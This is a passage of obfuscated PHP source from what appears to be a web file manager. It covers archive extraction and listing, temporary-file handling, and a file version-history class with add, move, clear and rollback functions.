= $›öôĞ²”[$ó‡‚Î Ë[1115]]; if (!($ÉÉ¦‚à… = parent::info($„øëô‹))) { show_json(LNG($ó‡‚Î Ë[1116]), !1); } if (!($’ì±ìÛÁ = parent::infoFull($»Í¼ï½ï))) { $»Í¼ï½ï = parent::mkdir($»Í¼ï½ï); $’ì±ìÛÁ = array($ó‡‚Î Ë[76] => $»Í¼ï½ï); } else { if (isset($’ì±ìÛÁ[$ó‡‚Î Ë[397]]) && trim($’ì±ìÛÁ[$ó‡‚Î Ë[76]], $ó‡‚Î Ë[8]) != trim($»Í¼ï½ï, $ó‡‚Î Ë[8])) { $äíÕ‡½ğ = KodIO::make($’ì±ìÛÁ[$ó‡‚Î Ë[492]]); $ï°ò½™š = parent::fileNameAuto($äíÕ‡½ğ, $’ì±ìÛÁ[$ó‡‚Î Ë[28]], REPEAT_RENAME_FOLDER, !0); $»Í¼ï½ï = parent::mkdir($äíÕ‡½ğ . $ï°ò½™š); $’ì±ìÛÁ = array($ó‡‚Î Ë[76] => $»Í¼ï½ï); } } $»Í¼ï½ï = $’ì±ìÛÁ[$ó‡‚Î Ë[76]]; $ÇÇş«…‰ = self::tmpFileName($ÉÉ¦‚à…); $½Ø—îû¾ = TEMP_FILES . $ÇÇş«…‰; del_dir($½Ø—îû¾); mk_dir($½Ø—îû¾); $è±Ç‰É´ = self::fileExt($ÉÉ¦‚à…); $Õ¯Ÿ„Ò¤ = $½Ø—îû¾ . $ó‡‚Î Ë[95] . $è±Ç‰É´; if (!@file_exists(self::iconvSystem($Õ¯Ÿ„Ò¤))) { $ğ¯ˆƒÁ– = self::localFilePath($„øëô‹, $è±Ç‰É´); $Õ¯Ÿ„Ò¤ = $ğ¯ˆƒÁ– ? $ğ¯ˆƒÁ– : parent::download($„øëô‹, $Õ¯Ÿ„Ò¤); } $Õ¯Ÿ„Ò¤ = self::iconvSystem($Õ¯Ÿ„Ò¤); $¯ÄÎüÉŞ = isset($›öôĞ²”[$ó‡‚Î Ë[1117]]) ? $›öôĞ²”[$ó‡‚Î Ë[1117]] : $ó‡‚Î Ë[1118]; $ôÃõ¬Ãß = KodArchive::extract($Õ¯Ÿ„Ò¤, $½Ø—îû¾ . $ó‡‚Î Ë[8], $¯ÄÎüÉŞ); self::archiveExt(); if (!$ôÃõ¬Ãß[$ó‡‚Î Ë[1119]]) { show_json($ó‡‚Î Ë[1120] . $ôÃõ¬Ãß[$ó‡‚Î Ë[1121]], !1); } Hook::trigger($ó‡‚Î Ë[1122], $½Ø—îû¾); recursion_dir($½Ø—îû¾, $ê€ÕåÄâ, $´ğ›İ‰­, 0); $¨â›ÃÎ = array_merge($ê€ÕåÄâ, $´ğ›İ‰­); foreach ($¨â›ÃÎ as $ĞµŸÛ²ó) { $ĞµŸÛ²ó = self::iconvApp($ĞµŸÛ²ó); self::move($ĞµŸÛ²ó, $»Í¼ï½ï, $ü®öí¬ñ); } del_dir($½Ø—îû¾); if (!$ğ¯ˆƒÁ–) { del_file($Õ¯Ÿ„Ò¤); } return !0; } public static function unzipList($¾èŞûÔ) { $µôğŒÁõ =& $_SERVER[ÏÒ Ì„]; $ã…¦áÙ« = $¾èŞûÔ[$µôğŒÁõ[76]]; $³›¶‡€Ò = isset($¾èŞûÔ[$µôğŒÁõ[1123]]) ? $¾èŞûÔ[$µôğŒÁõ[1123]] : -1; $ŒÄèÆ“÷ = 50000; if (request_url_safe($ã…¦áÙ«)) { $ÙË•™‚¿ = parse_url_query($ã…¦áÙ«); if (!isset($ÙË•™‚¿[$µôğŒÁõ[76]])) { show_json($µôğŒÁõ[1124], !1); } } $»¸Å£Öµ = isset($ÙË•™‚¿) ? $ÙË•™‚¿[$µôğŒÁõ[76]] : $ã…¦áÙ«; $½Ì´ıûˆ = self::info($»¸Å£Öµ); $—šüÄÈÙ = self::fileExt($½Ì´ıûˆ); $ßİõ€Š” = self::tmpFileName($½Ì´ıûˆ); if (isset($ÙË•™‚¿)) { $³®Ô‹ï“ = array($ÙË•™‚¿[$µôğŒÁõ[76]], $ÙË•™‚¿[$µôğŒÁõ[1123]], $ÙË•™‚¿[$µôğŒÁõ[28]]); $öÆ’¸ÂŒ = md5(implode($µôğŒÁõ[71], $³®Ô‹ï“)) . $µôğŒÁõ[95] . get_path_ext($ÙË•™‚¿[$µôğŒÁõ[28]]); } else { $³®Ô‹ï“ = array($½Ì´ıûˆ[$µôğŒÁõ[28]], $½Ì´ıûˆ[$µôğŒÁõ[76]], $½Ì´ıûˆ[$µôğŒÁõ[78]]); $öÆ’¸ÂŒ = md5(implode($µôğŒÁõ[71], $³®Ô‹ï“)) . $µôğŒÁõ[95] . $—šüÄÈÙ; } if ($³›¶‡€Ò == -1) { $¡â™¬§ù = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\x69\145\167\57{$ßİõ€Š”}\x2f{$öÆ’¸ÂŒ}\56\154\x6f\x67"; $ø…Ê“‚ë = self::infoFull($¡â™¬§ù); if ($ø…Ê“‚ë) { $¡â™¬§ù = $ø…Ê“‚ë[$µôğŒÁõ[76]]; $èˆ¬œ­¬ = self::getContent($¡â™¬§ù); if ($èˆ¬œ­¬) { $ÎŒÕÅ†ó = json_decode($èˆ¬œ­¬, !0); $ÎŒÕÅ†ó = is_array($ÎŒÕÅ†ó) ? $ÎŒÕÅ†ó : array(); if (count($ÎŒÕÅ†ó) >= $ŒÄèÆ“÷) { show_json(sprintf(LNG($µôğŒÁõ[1125]), count($ÎŒÕÅ†ó)), !1); } return $ÎŒÕÅ†ó; } } else { $¡â™¬§ù = self::mkfile($¡â™¬§ù); } } $×®ùüé´ = TEMP_FILES . $ßİõ€Š”; if (!is_dir($×®ùüé´)) { mk_dir($×®ùüé´); } $ù×¤×É¾ = $×®ùüé´ . $µôğŒÁõ[8] . $öÆ’¸ÂŒ; if (!@file_exists(self::iconvSystem($ù×¤×É¾))) { if (isset($ÙË•™‚¿)) { url_request($ã…¦áÙ«, $µôğŒÁõ[1126], $ù×¤×É¾); } else { $µÄÜÛÏÖ = self::localFilePath($ã…¦áÙ«, $—šüÄÈÙ); $ù×¤×É¾ = $µÄÜÛÏÖ ? $µÄÜÛÏÖ : self::download($ã…¦áÙ«, $ù×¤×É¾); } } $ù×¤×É¾ = self::iconvSystem($ù×¤×É¾); if ($³›¶‡€Ò >= 0) { $€µ»…®Á = isset($¾èŞûÔ[$µôğŒÁõ[1127]]) ? $¾èŞûÔ[$µôğŒÁõ[1127]] : !1; $Šû£’¬ = isset($¾èŞûÔ[$µôğŒÁõ[28]]) ? $¾èŞûÔ[$µôğŒÁõ[28]] : $µôğŒÁõ[33]; KodArchive::filePreview($ù×¤×É¾, $³›¶‡€Ò, $€µ»…®Á, $Šû£’¬); self::archiveExt(); die; } $‘ğ÷ôê¡ = KodArchive::listContent($ù×¤×É¾); self::archiveExt(); del_dir($×®ùüé´); if (!$‘ğ÷ôê¡[$µôğŒÁõ[1119]]) { show_json($‘ğ÷ôê¡[$µôğŒÁõ[1121]], !1); } $ÎŒÕÅ†ó = json_encode($‘ğ÷ôê¡[$µôğŒÁõ[1121]]); self::setContent($¡â™¬§ù, $ÎŒÕÅ†ó); if (count($‘ğ÷ôê¡[$µôğŒÁõ[1121]]) >= $ŒÄèÆ“÷) { show_json(sprintf(LNG($µôğŒÁõ[1125]), count($‘ğ÷ôê¡[$µôğŒÁõ[1121]])), !1); } return $‘ğ÷ôê¡[$µôğŒÁõ[1121]]; } private static function fileExt($ÌÖíòºú) { $ıúÍÙ™Á =& $_SERVER[ÏÒ Ì„]; $…ººî® = $ÌÖíòºú[$ıúÍÙ™Á[168]]; if ($…ººî® == $ıúÍÙ™Á[1128]) { $â™Õ¡² = $ıúÍÙ™Á[1129]; if (substr($ÌÖíòºú[$ıúÍÙ™Á[28]], -strlen($â™Õ¡²)) == $â™Õ¡²) { $…ººî® = $ıúÍÙ™Á[1130]; } } self::archiveExt($…ººî®); return $…ººî®; } private static function zipFileList($ÂÅ¯ß¢ù, $íìÔşŠ = false) { $‹µ‘±½³ =& $_SERVER[ÏÒ Ì„]; $âØİ›£Ç = array(); foreach ($ÂÅ¯ß¢ù as $ÔÁö©ÅŸ) { $ÓÌ¾ì‹ = $ÔÁö©ÅŸ[$‹µ‘±½³[76]]; if ($íìÔşŠ) { $ÓÌ¾ì‹ = self::copy($ÔÁö©ÅŸ[$‹µ‘±½³[76]], $íìÔşŠ, $‹µ‘±½³[815]); } else { $¸¾½¹ìé = self::init($ÔÁö©ÅŸ[$‹µ‘±½³[76]]); if ($¸¾½¹ìé->getType() == $‹µ‘±½³[106]) { $ÓÌ¾ì‹ = $¸¾½¹ìé->path; } } if ($ÓÌ¾ì‹ && self::local()->exist($ÓÌ¾ì‹)) { $âØİ›£Ç[$ÔÁö©ÅŸ[$‹µ‘±½³[76]]] = $ÓÌ¾ì‹; } } if (!empty($âØİ›£Ç)) { return array_values($âØİ›£Ç); } show_json(LNG($‹µ‘±½³[1094]), !1); } public static function tmpFileName($–ÍÌ‚ˆ¥) { $İëÉ×¬à =& $_SERVER[ÏÒ Ì„]; $ Îå©ùü = array($–ÍÌ‚ˆ¥[$İëÉ×¬à[28]], $–ÍÌ‚ˆ¥[$İëÉ×¬à[76]], $–ÍÌ‚ˆ¥[$İëÉ×¬à[78]], $–ÍÌ‚ˆ¥[$İëÉ×¬à[515]]); return md5(implode($İëÉ×¬à[71], $ Îå©ùü)); } private static function localFilePath($×ïğ÷Ó, $¡½µÒÍ¾) { $€Ã¿ñ• =& $_SERVER[ÏÒ Ì„]; if ($¡½µÒÍ¾ == $€Ã¿ñ•[1131] && strtoupper(substr(PHP_OS, 0, 3)) == $€Ã¿ñ•[1132]) { return !1; } $£©ÙÒË¨ = KodIO::parse($×ïğ÷Ó); if ($£©ÙÒË¨[$€Ã¿ñ•[29]] == KodIO::KOD_SOURCE) { $ÕÀö•Ú = Model($€Ã¿ñ•[822])->fileInfoGet(KodIO::sourceID($×ïğ÷Ó)); if (!$ÕÀö•Ú[$€Ã¿ñ•[76]]) { show_json($€Ã¿ñ•[1133], !1); } $×ïğ÷Ó = $ÕÀö•Ú[$€Ã¿ñ•[76]]; } $ŞÓÊ´¯÷ = self::init($×ïğ÷Ó); if ($ŞÓÊ´¯÷->pathParse[$€Ã¿ñ•[1081]]) { $×ïğ÷Ó = $ŞÓÊ´¯÷->pathParse[$€Ã¿ñ•[1081]]; $ŞÓÊ´¯÷ = self::init($×ïğ÷Ó); } $Ò·î­¶ = $ŞÓÊ´¯÷->getType(); if ($Ò·î­¶ == $€Ã¿ñ•[106] || $Ò·î­¶ == $€Ã¿ñ•[1134]) { if (!$ŞÓÊ´¯÷->exist($ŞÓÊ´¯÷->path)) { show_json(LNG($€Ã¿ñ•[105]), !1); } return $ŞÓÊ´¯÷->path; } return !1; } private static function archiveExt($û÷•‹… = '') { $GLOBALS[$_SERVER[ÏÒ Ì„][1135]] = $û÷•‹…; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $”ò¦âÍÑ =& $_SERVER[ÏÒ Ì„]; $ÜÊ¬—‰õ = $GLOBALS[$”ò¦âÍÑ[6]][$”ò¦âÍÑ[88]]; if ($ÜÊ¬—‰õ[$”ò¦âÍÑ[1136]] != 1) { return; } if ($ÜÊ¬—‰õ[$”ò¦âÍÑ[1137]] <= 0) { return; } if (isset($_REQUEST[$”ò¦âÍÑ[1138]]) && $_REQUEST[$”ò¦âÍÑ[1138]] == $”ò¦âÍÑ[87]) { return; } Hook::bind($”ò¦âÍÑ[1139], $”ò¦âÍÑ[1140]); Hook::bind($”ò¦âÍÑ[1141], $”ò¦âÍÑ[1142]); Hook::bind($”ò¦âÍÑ[1143], $”ò¦âÍÑ[1144]); Hook::bind($”ò¦âÍÑ[1145], $”ò¦âÍÑ[1146]); Hook::bind($”ò¦âÍÑ[1147], $”ò¦âÍÑ[1148]); Hook::bind($”ò¦âÍÑ[1149], $”ò¦âÍÑ[1150]); } public static function eventBeforeUpload($µàê»®) { if ($µàê»®[3] && $µàê»®[3] != REPEAT_REPLACE) { return; } $®©“ıû¯ = self::parsePath($µàê»®[0]); if (!$®©“ıû¯) { return; } self::add($®©“ıû¯); } public static function eventBeforeEdit($×Íö¨íË) { $èßÇãÌ¬ = self::parsePath($×Íö¨íË[0]); if (!$èßÇãÌ¬) { return; } self::add($èßÇãÌ¬); } public static function eventBeforeCopyFile($ùÓæãÖ“, $ Ö“‡øû, $ïÑÈË™©, $¯•¡¹ÉÛ, $ó§£ºĞó, $©ù»îÉç) { $ÑÆ™˜‹ú = $ïÑÈË™©->getPathOuter($¯•¡¹ÉÛ); $Ï«îµÖ = self::parsePath($ÑÆ™˜‹ú); if (!$Ï«îµÖ) { return; } self::add($Ï«îµÖ); } public static function eventBeforeRename($ÇÊ›…ÀÖ) { $¶Í†¾Ã =& $_SERVER[ÏÒ Ì„]; $¦ĞÍãúš = self::parsePath($ÇÊ›…ÀÖ[0]); if (!$¦ĞÍãúš) { return; } $â°ÑÉË = self::checkInHistory($¦ĞÍãúš); if (!$â°ÑÉË) { return; } if ($â°ÑÉË[$¶Í†¾Ã[29]] == $¶Í†¾Ã[193]) { $âÎıß³ = self::listData($¦ĞÍãúš); if ($âÎıß³ && $âÎıß³[$¶Í†¾Ã[367]]) { self::moveHistory($¦ĞÍãúš, $ÇÊ›…ÀÖ[1]); } } else { IO::rename($â°ÑÉË[$¶Í†¾Ã[76]], $ÇÊ›…ÀÖ[1]); } } public static function eventBeforeMove($æÀËàáº) { $¾¬İ¶¿º =& $_SERVER[ÏÒ Ì„]; $İ•±›Š­ = self::parsePath($æÀËàáº[0]); if (!$İ•±›Š­) { return; } $ÕÒÂšö = self::parsePath($æÀËàáº[1]); if (!$ÕÒÂšö) { return; } $äÇªà»Ï = $æÀËàáº[3]; $ÆØÒÄ‡ê = self::checkInHistory($İ•±›Š­); if (!$ÆØÒÄ‡ê) { return; } $ø¾±şâÃ = self::pathHistory($ÕÒÂšö); if ($ÆØÒÄ‡ê[$¾¬İ¶¿º[29]] == $¾¬İ¶¿º[193]) { $å‹è€¸Ü = self::listData($İ•±›Š­); $ÑÑñ×ëç = rtrim($ÕÒÂšö, $¾¬İ¶¿º[8]) . $¾¬İ¶¿º[8] . ($äÇªà»Ï ? $äÇªà»Ï : get_path_this($İ•±›Š­)); $Îí€©Í = self::listData($ÑÑñ×ëç); if ($å‹è€¸Ü && $å‹è€¸Ü[$¾¬İ¶¿º[367]] && $Îí€©Í && $Îí€©Í[$¾¬İ¶¿º[367]]) { return self::clear($İ•±›Š­); } if ($å‹è€¸Ü && $å‹è€¸Ü[$¾¬İ¶¿º[367]]) { self::moveHistory($İ•±›Š­, $äÇªà»Ï, $ø¾±şâÃ); } } else { IO::move($ÆØÒÄ‡ê[$¾¬İ¶¿º[76]], $ø¾±şâÃ, !1, $äÇªà»Ï); self::clearEmptyFolder(IO::pathFather($ÆØÒÄ‡ê[$¾¬İ¶¿º[76]])); } } public static function eventAfterRemove($Ñƒåñ¢Ï, $ö²Ú‹Í) { $–ãÆİå– =& $_SERVER[ÏÒ Ì„]; if (!$ö²Ú‹Í) { return; } $…‚œİÅ = self::parsePath($Ñƒåñ¢Ï[0]); if (!$…‚œİÅ) { return; } $’›§€şœ = self::checkInHistory($…‚œİÅ); if (!$’›§€şœ) { return; } if ($’›§€şœ[$–ãÆİå–[29]] == $–ãÆİå–[193]) { $³¾•ÕÇÁ = self::listData($…‚œİÅ, !1); if ($³¾•ÕÇÁ && $³¾•ÕÇÁ[$–ãÆİå–[367]]) { self::clear($…‚œİÅ, !1); } } else { IO::remove($’›§€şœ[$–ãÆİå–[76]]); self::clearEmptyFolder(IO::pathFather($’›§€şœ[$–ãÆİå–[76]])); } } private static function checkInHistory($§Æ—õ¦–) { $òùÜ™ÔÊ = self::pathHistory($§Æ—õ¦–); if (!IO::exist($òùÜ™ÔÊ)) { $òùÜ™ÔÊ .= $_SERVER[ÏÒ Ì„][1151]; } return IO::exist($òùÜ™ÔÊ) ? IO::info($òùÜ™ÔÊ) : !1; } private static function parsePath($¦Óà–Â) { $ßöäÄËÑ =& $_SERVER[ÏÒ Ì„]; if (!$¦Óà–Â) { return !1; } if ($GLOBALS[$ßöäÄËÑ[1152]]) { return; } $Â¤õ¯êé = KodIO::parse($¦Óà–Â); $ÈùÀ´…Š = $Â¤õ¯êé[$ßöäÄËÑ[29]]; $ÜŒ˜†ôı = !$ÈùÀ´…Š || $ÈùÀ´…Š == KodIO::KOD_IO || $ÈùÀ´…Š == KodIO::KOD_SHARE_ITEM; if (!$ÜŒ˜†ôı || !$Â¤õ¯êé[$ßöäÄËÑ[1153]]) { return !1; } if (substr($¦Óà–Â, 0, strlen(DATA_PATH . $ßöäÄËÑ[1154])) == DATA_PATH . $ßöäÄËÑ[1154]) { return !1; } if ($ÈùÀ´…Š == KodIO::KOD_SHARE_ITEM) { $À«ª‘É´ = IO::init($¦Óà–Â); if ($À«ª‘É´->pathParse[$ßöäÄËÑ[1081]]) { return self::parsePath($À«ª‘É´->pathParse[$ßöäÄËÑ[1081]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‡—Ò²Ãâ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ßöäÄËÑ[1155]); foreach ($‡—Ò²Ãâ as $öéœ…ùö) { if (!$ÈùÀ´…Š && substr($¦Óà–Â, 0, strlen($öéœ…ùö)) == $öéœ…ùö) { return !1; } } self::log($GLOBALS[$ßöäÄËÑ[1076]] . $ßöäÄËÑ[1156] . $¦Óà–Â); return $¦Óà–Â; } private static function pathHistory($¬ßÉÜı) { $ÏÓ´üÒÇ =& $_SERVER[ÏÒ Ì„]; $Ê¤áŞß = self::$_historyBase . ltrim(KodIO::clear($¬ßÉÜı), $ÏÓ´üÒÇ[8]); $Ê¤áŞß = str_replace(array($ÏÓ´üÒÇ[1157]), array($ÏÓ´üÒÇ[1158]), $Ê¤áŞß); return $Ê¤áŞß; } public static function log($·ÄÕäª›) { } public static function historyCount($¼â”şÌª) { $“ìäÕøˆ =& $_SERVER[ÏÒ Ì„]; $¸”œ½±Ê = array(); $Æı›íÎÖ = array(); foreach ($¼â”şÌª as $ï¬á·øµ) { $Øï“ˆİü = get_path_father($ï¬á·øµ); if (!$Æı›íÎÖ[$Øï“ˆİü]) { $Æı›íÎÖ[$Øï“ˆİü] = array(); } $Æı›íÎÖ[$Øï“ˆİü][] = get_path_this($ï¬á·øµ); } foreach ($Æı›íÎÖ as $Øï“ˆİü => $ÌÉƒ½¶ª) { $¹Á§¯ˆñ = self::parsePath($Øï“ˆİü); if (!$¹Á§¯ˆñ) { continue; } foreach ($ÌÉƒ½¶ª as $‘®ôã®) { $’Ì¨¼• = self::listData(rtrim($¹Á§¯ˆñ, $“ìäÕøˆ[8]) . $“ìäÕøˆ[8] . $‘®ôã®, !1); if ($’Ì¨¼• && $’Ì¨¼•[$“ìäÕøˆ[367]]) { $¸”œ½±Ê[rtrim($Øï“ˆİü, $“ìäÕøˆ[8]) . $“ìäÕøˆ[8] . $‘®ôã®] = count($’Ì¨¼•[$“ìäÕøˆ[367]]); } } } return $¸”œ½±Ê; } public static function add($è ö§±) { $Éûëœ™— =& $_SERVER[ÏÒ Ì„]; $˜åÇ©™å = self::listData($è ö§±); if (!$˜åÇ©™å) { return; } $”Õôìñ = Model($Éûëœ™—[760])->get($Éûëœ™—[1159]); $áºÈÚ¾ = $GLOBALS[$Éûëœ™—[6]][$Éûëœ™—[88]][$Éûëœ™—[1137]]; $ñ½ÆØõ = $”Õôìñ == $Éûëœ™—[1160] ? 5 : $áºÈÚ¾; if ($áºÈÚ¾ <= 0) { return; } $¬Í¤·›æ = IO::hashSimple($è ö§±); $Ğù‡˜ê• = IO::info($è ö§±); $îüº•ğç = $˜åÇ©™å[$Éûëœ™—[367]]; if ($Ğù‡˜ê•[$Éûëœ™—[78]] == 0) { return; } if ($Ğù‡˜ê•[$Éûëœ™—[78]] >= 1024 * 1024 * 500) { return !1; } if ($îüº•ğç && $îüº•ğç[0][$Éûëœ™—[171]] == $¬Í¤·›æ) { return !0; } if (array_key_exists($Éûëœ™—[196], $Ğù‡˜ê•) && !$Ğù‡˜ê•[$Éûëœ™—[196]]) { return !1; } $ëÚöĞ’– = short_id(time()); $òÉÛåÛ… = array($Éûëœ™—[395] => $ëÚöĞ’–, $Éûëœ™—[171] => $¬Í¤·›æ, $Éûëœ™—[28] => $Ğù‡˜ê•[$Éûëœ™—[28]] . $Éûëœ™—[95] . date($Éûëœ™—[1161]) . rand_string(1), $Éûëœ™—[78] => $Ğù‡˜ê•[$Éûëœ™—[78]], $Éûëœ™—[446] => USER_ID, $Éûëœ™—[194] => time(), $Éûëœ™—[1162] => $Éûëœ™—[33]); IO::mkdir($˜åÇ©™å[$Éûëœ™—[1163]]); $ÂºÜ•È = IO::copy($è ö§±, $˜åÇ©™å[$Éûëœ™—[1163]], !1, $òÉÛåÛ…[$Éûëœ™—[28]]); if (!$ÂºÜ•È) { self::clearEmptyFolder($˜åÇ©™å[$Éûëœ™—[1163]]); return !1; } array_unshift($îüº•ğç, $òÉÛåÛ…); if (count($îüº•ğç) > $ñ½ÆØõ) { $·«à¶çø = array_slice($îüº•ğç, $ñ½ÆØõ); foreach ($·«à¶çø as $×‹£”Ü) { IO::remove($˜åÇ©™å[$Éûëœ™—[1163]] . $×‹£”Ü[$Éûëœ™—[28]]); } $îüº•ğç = array_slice($îüº•ğç, 0, $ñ½ÆØõ); } return self::saveData($˜åÇ©™å[$Éûëœ™—[1164]], $îüº•ğç); } public static function remove($Íê»Õ™™, $ïµ‡ò‚²) { $ù†³Ğ¦“ =& $_SERVER[ÏÒ Ì„]; $©‹¼¶Ş = self::listData($Íê»Õ™™); $şÄ¶½Íî = array(); if (!$©‹¼¶Ş) { return !1; } foreach ($©‹¼¶Ş[$ù†³Ğ¦“[367]] as $æıÍœª¦) { if ($æıÍœª¦[$ù†³Ğ¦“[395]] == $ïµ‡ò‚²) { IO::remove($©‹¼¶Ş[$ù†³Ğ¦“[1163]] . $æıÍœª¦[$ù†³Ğ¦“[28]]); continue; } $şÄ¶½Íî[] = $æıÍœª¦; } return self::saveData($©‹¼¶Ş[$ù†³Ğ¦“[1164]], $şÄ¶½Íî); } public static function clear($ÔÑ»ô, $şƒŞ€Ôü = true) { $ÖÌïÊÆĞ =& $_SERVER[ÏÒ Ì„]; $²Ë¤Ù™Œ = self::listData($ÔÑ»ô, $şƒŞ€Ôü); if (!$²Ë¤Ù™Œ) { return !1; } foreach ($²Ë¤Ù™Œ[$ÖÌïÊÆĞ[367]] as $¡Ü¹‰ª×) { IO::remove($²Ë¤Ù™Œ[$ÖÌïÊÆĞ[1163]] . $¡Ü¹‰ª×[$ÖÌïÊÆĞ[28]]); } return self::saveData($²Ë¤Ù™Œ[$ÖÌïÊÆĞ[1164]], array()); } public static function moveHistory($ÉµŠ¡Ü˜, $Ç¯ÌĞ‚™ = '', $—ªÍ‚Æì = '') { $·Ô…Éå¦ =& $_SERVER[ÏÒ Ì„]; $¯é•¬¸ = self::listData($ÉµŠ¡Ü˜, !1); if (!$¯é•¬¸ || !$¯é•¬¸[$·Ô…Éå¦[367]]) { return !1; } $ˆ¢–¨šÓ = $·Ô…Éå¦[1151]; $Ç¯ÌĞ‚™ = $Ç¯ÌĞ‚™ ? $Ç¯ÌĞ‚™ : get_path_this($ÉµŠ¡Ü˜); $—ªÍ‚Æì = $—ªÍ‚Æì ? $—ªÍ‚Æì : $¯é•¬¸[$·Ô…Éå¦[1163]]; $Å‚Ø’›ç = substr(get_path_this($¯é•¬¸[$·Ô…Éå¦[1164]]), 0, -strlen($ˆ¢–¨šÓ)); foreach ($¯é•¬¸[$·Ô…Éå¦[367]] as $ëä”ê¶ => $Ú¹²Â±Ô) { $ëÛ”Áãì = $Ç¯ÌĞ‚™ . substr($Ú¹²Â±Ô[$·Ô…Éå¦[28]], strlen($Å‚Ø’›ç)); $å¯Ìô« = IO::move($¯é•¬¸[$·Ô…Éå¦[1163]] . $Ú¹²Â±Ô[$·Ô…Éå¦[28]], $—ªÍ‚Æì, !1, $ëÛ”Áãì); if ($å¯Ìô«) { $¯é•¬¸[$·Ô…Éå¦[367]][$ëä”ê¶][$·Ô…Éå¦[28]] = $ëÛ”Áãì; } } $¯é•¬¸[$·Ô…Éå¦[1164]] = IO::move($¯é•¬¸[$·Ô…Éå¦[1164]], $—ªÍ‚Æì, !1, $Ç¯ÌĞ‚™ . $ˆ¢–¨šÓ); self::saveData($¯é•¬¸[$·Ô…Éå¦[1164]], $¯é•¬¸[$·Ô…Éå¦[367]]); self::clearEmptyFolder($¯é•¬¸[$·Ô…Éå¦[1163]]); } public static function rollback($ë“ÏŸƒÅ, $‹¯€éú´) { $¤ç÷©Çò =& $_SERVER[ÏÒ Ì„]; $óã»¨µø = self::listData($ë“ÏŸƒÅ); if (!$óã»¨µø) { return; } $æ”ª¢™ß = IO::info($ë“ÏŸƒÅ); foreach ($óã»¨µø[$¤ç÷©Çò[367]] as $½Öá­ç => $×õ²‘á¡) { if ($×õ²‘á¡[$¤ç÷©Çò[395]] == $‹¯€éú´) { self::add($ë“ÏŸƒÅ); $Í®¢õÖé = $óã»¨µø[$¤ç÷©Çò[1163]] . $×õ²‘á¡[$¤ç÷©Çò[28]]; $˜Ø°ÅÃĞ = IO::copy($Í®¢õÖé, IO::pathFather($ë“ÏŸƒÅ), REPEAT_REPLACE, $æ”ª¢™ß[$¤ç÷©Çò[28]]); if ($˜Ø°ÅÃĞ) { self::remove($ë“ÏŸƒÅ, $‹¯€éú´); } return $˜Ø°ÅÃĞ; } } return !1; } public static function setDetail($ÜÅÀ¦‡, $ĞÌ˜…‡ù, $ÙÁÉ¤¥ƒ) { $ãÄ¦‹ê =& $_SERVER[ÏÒ Ì„]; $Ü®úÆŸ‡ = self::listData($ÜÅÀ¦‡); if (!$Ü®úÆŸ‡) { return; } foreach ($Ü®úÆŸ‡[$ãÄ¦‹ê[367]] as $ÙØ¤ËÉ´ => $°ÓÜÜĞ­) { if ($°ÓÜÜĞ­[$ãÄ¦‹ê[395]] == $ĞÌ˜…‡ù) { $Ü®úÆŸ‡[$ãÄ¦‹ê[367]][$ÙØ¤ËÉ´][$ãÄ¦‹ê[1162]] = $ÙÁÉ¤¥ƒ; self::saveData($Ü®úÆŸ‡[$ãÄ¦‹ê[1164]], $Ü®úÆŸ‡[$ãÄ¦‹ê[367]]); return !0; } } return !1; } public static function fileInfo($“©öÕ§ä, $ËüÔâßš) { $ãû»êƒï =& $_SERVER[ÏÒ Ì„]; $ŒˆÛ”Âë = self::listData($“©öÕ§ä); if (!$ŒˆÛ”Âë) { show_json(LNG($ãû»êƒï[105]), !1); } $Ù­”ıœ‡ = $ãû»êƒï[33]; foreach ($ŒˆÛ”Âë[$ãû»êƒï[367]] as $×Ò›Ô‡û => $õĞ‚ùİ) { if ($õĞ‚ùİ[$ãû»êƒï[395]] != $ËüÔâßš) { continue; } $Ù­”ıœ‡ = $ŒˆÛ”Âë[$ãû»êƒï[1163]] . $õĞ‚ùİ[$ãû»êƒï[28]]; break; } if (!$Ù­”ıœ‡) { show_json(LNG($ãû»êƒï[105]), !1); } return IO::info($Ù­”ıœ‡); } public static function fileOut($²‘ï‹Öâ, $˜§ ‰€, $ôÁõ«Û = false) { $é¦ü€¼£ =& $_SERVER[ÏÒ Ì„]; $»í†½¿ = self::fileInfo($²‘ï‹Öâ, $˜§ ‰€); $¼¡Ã¯¦õ =& $GLOBALS[$é¦ü€¼£[7]]; $ôÁõ«Û = isset($¼¡Ã¯¦õ[$é¦ü€¼£[1127]]) && $¼¡Ã¯¦õ[$é¦ü€¼£[1127]] == 1; if (isset($¼¡Ã¯¦õ[$é¦ü€¼£[29]]) && $¼¡Ã¯¦õ[$é¦ü€¼£[29]] == $é¦ü€¼£[1165]) { return IO::fileOutImage($»í†½¿[$é¦ü€¼£[76]], $¼¡Ã¯¦õ[$é¦ü€¼£[1166]]); } IO::fileOut($»í†½¿[$é¦ü€¼£[76]], $ôÁõ«Û, get_path_this($²‘ï‹Öâ)); } public static function listData($Ãá¨¶Ï–, $ï¯†éìØ = true) { $­²ÄêÃ¨ =& $_SERVER[ÏÒ Ì„]; if ($ï¯†éìØ && !IO::exist($Ãá¨¶Ï–)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ãá¨¶Ï–, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $±êêÜà = self::pathHistory($Ãá¨¶Ï–); $†¿Üì¢¥ = array($­²ÄêÃ¨[1164] => $±êêÜà . $­²ÄêÃ¨[1151], $­²ÄêÃ¨[1163] => rtrim(get_path_father($±êêÜà), $­²ÄêÃ¨[8]) . $­²ÄêÃ¨[8], $­²ÄêÃ¨[367] => array()); $¶Å¾¥‚¹ = IO::getContent($†¿Üì¢¥[$­²ÄêÃ¨[1164]]); if ($¶Å¾¥‚¹) { $²±­ãø­ = json_decode($¶Å¾¥‚¹, !0); if (is_array($²±­ãø­)) { $†¿Üì¢¥[$­²ÄêÃ¨[367]] = $²±­ãø­; } } return $†¿Üì¢¥; } private static function saveData($šƒƒËÌƒ, $í›ˆ¾óì) { $§‡×Å€” =& $_SERVER[ÏÒ Ì„]; self::log($§‡×Å€”[1167] . $šƒƒËÌƒ . $§‡×Å€”[68] . count($í›ˆ¾óì), $§‡×Å€”[742]); if ($í›ˆ¾óì) { return IO::setContent($šƒƒËÌƒ, json_encode($í›ˆ¾óì)); } $¬«í = IO::pathFather($šƒƒËÌƒ); IO::remove($šƒƒËÌƒ); self::clearEmptyFolder($¬«í); return !0; } public static function 